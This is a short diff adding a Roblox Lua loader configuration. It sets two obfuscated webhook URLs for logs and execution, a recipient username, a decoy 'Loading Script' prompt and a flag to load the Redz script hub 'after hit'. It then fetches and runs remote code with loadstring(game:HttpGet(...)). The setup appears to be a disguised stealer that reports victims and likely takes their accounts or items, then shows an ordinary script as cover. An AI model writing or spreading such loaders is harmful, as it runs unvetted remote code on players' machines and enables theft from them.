@@ -1,0 +1,8 @@
+LogsWebhook = "https://webhook-protect.vercel.app/api/webhook?id=N3B4cGU3dVljd1VmXzRUZ05Kc0ZjdzpCWVNKNm92SzQ4WlphOVpxenpUbHV4ZDRkekFlVFp2QjZ6LVlfT05kV0tPd0E2V1dhYXlXelM3UWNkU3dPSTVzaWJXbkhLOUFKSVlpV3JCMXFJZC0yRElzd0VfbktRUEV3S3AtZGNoWEUzTUNqQkdyV1h4cTJJNkNLM0VJSk9CWklOOEV1amxRSlJQTjNseGlRWjhsS1BVczI3cmtxMkw4U1pjeTBkMTVSZ2M"
+ExecutionWebhook = "https://webhook-protect.vercel.app/api/webhook?id=X1pBc195bUtUOEp6UC1UTzM3aXV3dzpRcmNNNDBKcGljU3d5Y2VpUkZKUTQxdUhINHYtUWhSQWNYM0poMDFTWXo2WnlPRDRYVjlpRmJwU1VZbm44TzRYY25Vd1BLVkt0UXlvLWI4WGlSMlNvcndIYTFhTERSbGRnSmVFYVhxeDhhMEhtTm9pVnMzUFVBcHBPMXZ1ZFRWR3poSWxLZ0pZaTdiQ3ZkYTVJbVJUeUdoQ2dncV9xQmYycnZCVEE5TzVuaEE"
+Username = "HTNTPbloxfruit"
+PromptText = "Loading Script"
+RandomizedPrompt = true
+LoadRedzAfterHit = true
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/lelel22f/Hm/refs/heads/main/SimpleTesting"))()
